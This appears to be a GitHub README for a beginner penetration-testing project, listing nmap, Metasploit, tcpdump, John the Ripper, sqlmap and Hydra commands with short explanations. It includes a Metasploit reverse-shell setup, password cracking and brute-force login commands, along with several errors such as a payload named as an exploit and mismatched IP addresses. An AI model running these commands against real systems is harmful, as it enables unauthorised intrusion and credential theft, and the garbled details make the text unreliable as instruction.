# nmap-port-scanning
This project demonstrates real-time network scanning using nmap. It identifies active hosts, open ports, and services, ideal for penetration testing and network reconnaissance. Includes a live demo video and Docker support for easy setup. Perfect for cybersecurity enthusiasts and professionals. #nmap #pentesting #cybersecurity


# nmap Port Scanning Tool

This is a real-time port scanning tool using nmap. It helps you discover active hosts, open ports, and services on your network.

## Features
- Real-time network scanning
- Docker support
- Live demo included
- Easy to use

## How to Use
1. Clone the repo: git clone https://github.com/yourusername/nmap-port-scanning.git
2. Run: nmap -sP 192.168.64.2/24
3. version nmap -sV 192.168.64.1
4. nmap is a network discovery and security auditing tool.
    -sV enables version detection to identify what services are running on the target.
    192.168.64.1 is the target network range.

5. example**
6. Nmap scan report for 192.168.64.1
Host is up (0.00043s latency).
Not shown: 254 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http    Apache httpd 2.4.29
443/tcp  open  sslhttp Apache httpd 2.4.29


8.Port Scanning with Nmap

Command:

nmap -p 80,443,22 192.168.64.1

Explanation:

    Scans only specific ports (80, 443, 22) on the target IP 1192.168.64.1.
    Useful for checking if services like SSH, HTTP, and HTTPS are running.

9. Vulnerability Scanning with Nmap

Command:

nmap --script vuln 192.168.64.2/24

Explanation:

    Runs Nmap scripts to detect known vulnerabilities on the target network.
    Great for identifying outdated software or misconfigurations.

10.Metasploit Module Execution

Command:

msfconsole
use exploit/windows/meterpreter/reverse_tcp
set RHOSTS 192.168.64.2
set LHOST 192.168.64.1
set LPORT 4444
exploit

Explanation:

    Starts the Metasploit console.
    Loads a reverse TCP exploit module (commonly used for penetration testing).
    Sets the target IP (RHOSTS) and listener IP (LHOST) and port (LPORT).
    Executes the exploit to gain access to the target machine.

11.Wireshark Capture (Terminal)

Command:

tcpdump -i eth0 -w capture.pcap

Explanation:

    Captures network traffic on the eth0 interface.
    Saves the capture to a file named capture.pcap for later analysis with Wireshark.

12.Password Cracking with John the Ripper

Command:

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Explanation:

    Uses the rockyou.txt wordlist to crack hashes in the hash.txt file.
    Useful for testing password strength and recovering hashes.

13.SQLMap for SQL Injection

Command:

sqlmap -u "http://example.com/vulnerable.php?id=1" --dbs

Explanation:

    Tests the URL for SQL injection vulnerabilities.
    The --dbs flag lists all databases on the target server.
14.DNS Lookup with Dig

Command:

dig example.com

Explanation:

    Performs a DNS lookup to get information about the domain.
    Useful for reconnaissance in network analysis.
15.Tcpdump for Traffic Analysis

Command:

tcpdump -i eth0 port 80 -w http_traffic.pcap

Explanation:

    Captures all HTTP traffic on the eth0 interface.
    Saves the traffic to http_traffic.pcap for analysis.
16. Hydra for Brute Force Attacks

Command:

hydra -l admin -p password 192.168.64.2 http-get

Explanation:

    Attempts to brute force login credentials using the username admin and password password.
    Targets the HTTP service on the IP 192.168.1.10.






## Demo
Watch the live demo: [Watch Demo](https://example.com/demo) pending/////

## License
MIT License

## Contact
For support, email: jadimanoj.com
